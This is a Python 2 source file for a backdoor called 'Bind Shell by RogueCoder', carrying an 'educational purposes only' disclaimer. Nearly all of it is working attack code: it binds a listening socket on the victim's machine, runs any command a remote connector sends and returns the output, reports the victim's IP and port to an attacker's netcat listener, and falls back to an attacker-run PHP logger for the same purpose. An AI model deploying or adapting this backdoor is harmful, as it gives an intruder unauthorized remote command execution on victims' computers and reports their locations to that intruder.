#!/usr/bin/python
'''
Bind Shell by RogueCoder

This code is for educational purposes only and I do not take any responsibility regarding any damage caused
by someone using this script. Using this without the permission of the victim is illegal.
'''
import sys,socket,time,re,subprocess,os

'''
Connects to www.echoip.com and returns the victims
external IP address.
'''
def getVictimIp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect(("www.echoip.com",80))
        sock.send("GET / HTTP/1.1\r\nHost: echoip.com\r\nConnection: close\r\n\r\n")
        response = sock.recv(1024)
        response = response.decode("utf-8")
        match = re.search("(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4})", response)
        if match:
            return match.group(0)
        return False
    except:
        return False

'''
Fallback Logger

If the real-time alert method fails or is not in use the backdoor can connect
to a site controlled by the attacker and write IP and port to a text file using
a PHP script.
'''
def fallbackLogger():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((logurl,80))
        sock.send("GET /logger.php?ip=%s\r\nHost: %s\r\nConnection: close\r\n\r\n"%(vip,url))
        sock.close()
        return True
    except:
        return False

'''
Real-time alert

The attacker sets up a listener using netcat and will be alerted in real-time
with IP address and port every time a backdoor is activated
'''
def alert(type):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((rip,rport))
        now = time.strftime("%Y/%m/%d %H:%M:%S")
        if type == 1:
            sock.send("[+] Connection established to %s on port %s - %s\n"%(vip,vport,now))
        elif type == 2:
            sock.send("[-] Connection has been lost for %s on port %s - %s\n"%(vip,vport,now))
        sock.close()
        return True
    except:
        return False

'''
Make Prompt String 1 simulator

This simulates the PS1 when connected to the shell
'''
def makePS1():
    user = subprocess.check_output(['whoami']).strip()
    host = subprocess.check_output(['hostname']).strip()
    cwd = subprocess.check_output(['pwd']).strip()
    return "[%s@%s %s]$ "%(user,host,cwd)

'''
Bind socket to victim
'''
def binder(sock):
    sock = sock if sock is not False else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((vip,vport))
    except:
        time.sleep(5)
        binder(sock)
    return sock
    
'''
Listen for any incoming connections and commands
'''
def listener(sock):
    sock.listen(5)
    try:
        conn,addr = sock.accept()
        conn.send("[*] Connection established\n\n")
        conn.send(makePS1())
    except:
        listener(sock)
    try:
        while 1:
            try:
                data = conn.recv(1024)
                cmd = data.strip().split(' ')
                if cmd[0] == 'cd':
                    os.chdir(cmd[1])
                elif cmd[0] in ("exit","quit","close"):
                    break
                elif cmd[0] == "die":
                    alert(2)
                    conn.send("[*] Closing backdoor. No more connections will be accepted\n")
                    conn.close()
                    sock.shutdown(socket.SHUT_RDWR)
                    sock.close()
                    return
                else:
                    conn.send(subprocess.check_output(cmd))
                conn.send(makePS1())
            except:
                break
        conn.send("[*] Closing session. Welcome back another time!\n")
        conn.close()
        listener(sock)
    except:
        alert(2)
        conn.close()
        sock.shutdown()
        sock.close()
        initialize()

'''
Initialize shell
'''
def initialize():
    sock = binder(False)
    if not alert(1):
        if not fallbackLogger():
            print "Unable to alert"
    listener(sock)

if __name__ == "__main__":
    #vip = getVictimIp()     # Get external IP address for victim
    vip = '127.0.0.1'
    vport = 4444            # The port that the shell will bind to
    rport = 3000            # Remote listener port used by attacker
    rip = ''       # Listening IP
    logurl = 'localhost'    # Url used by fallback logger
    initialize()            # Initialize backdoor
